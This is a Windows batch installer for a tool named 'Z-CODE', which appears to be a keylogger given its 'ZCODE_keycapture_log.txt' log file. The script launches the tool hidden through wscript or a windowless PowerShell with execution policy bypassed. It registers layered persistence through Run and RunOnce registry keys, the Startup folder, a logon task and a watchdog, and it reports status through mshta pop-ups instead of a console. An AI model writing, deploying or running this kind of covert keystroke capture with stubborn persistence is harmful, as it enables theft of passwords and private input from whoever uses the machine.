@echo off
setlocal EnableExtensions
if /i "%~1"=="__hidden" goto main

rem --- double-clicked: hand off to a console-less run ---
wscript //nologo "%~dp0install.vbs"
exit /b

:main
set "HERE=%~dp0"
set "PS1=%HERE%Z-CODE.ps1"
set "U=%USERPROFILE%"

echo ==== Z-CODE installer ====

echo stop>"%U%\ZCODE.stop"
powershell -NoProfile -Command "Get-CimInstance Win32_Process | ? { $_.CommandLine -like '*Z-CODE.ps1*' } | % { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue }" >nul 2>&1
del "%U%\ZCODE.pid" >nul 2>&1
del "%U%\ZCODE.stop" >nul 2>&1
ping -n 2 127.0.0.1 >nul

echo [1/4] registering persistence...
powershell -NoProfile -ExecutionPolicy Bypass -File "%PS1%" -Register >nul 2>&1
if errorlevel 1 echo      register step reported an error

echo [2/4] starting via hidden launcher...
wscript //nologo "%HERE%Z-CODE.vbs"
ping -n 5 127.0.0.1 >nul
if exist "%U%\ZCODE.pid" goto started

echo [3/4] launcher failed - falling back to hidden powershell...
powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File "%PS1%" -NoWatchdog
goto done

:started
echo      running.

:done
echo.
echo Persistence: HKCU Run + RunOnce + Startup folder + logon task + watchdog
echo Log: "%U%\ZCODE_keycapture_log.txt"
echo.
powershell -NoProfile -Command "$p = Get-CimInstance Win32_Process | Where-Object { $_.CommandLine -like '*Z-CODE.ps1*' }; if ($p) { 'RUNNING - PID ' + ($p.ProcessId -join ', ') } else { 'NOT RUNNING' }"
del "%U%\ZCODE.stop" >nul 2>&1

rem --- report without a console ---
if exist "%U%\ZCODE.pid" (
  mshta "javascript:alert('Z-CODE installed and running.\nLog: %U%\ZCODE_keycapture_log.txt\n\nStop with Ctrl+Alt+Q or stop.vbs');close()"
) else (
  mshta "javascript:alert('Z-CODE did NOT start. Check %U%\ZCODE_keycapture_log.txt');close()"
)
exit /b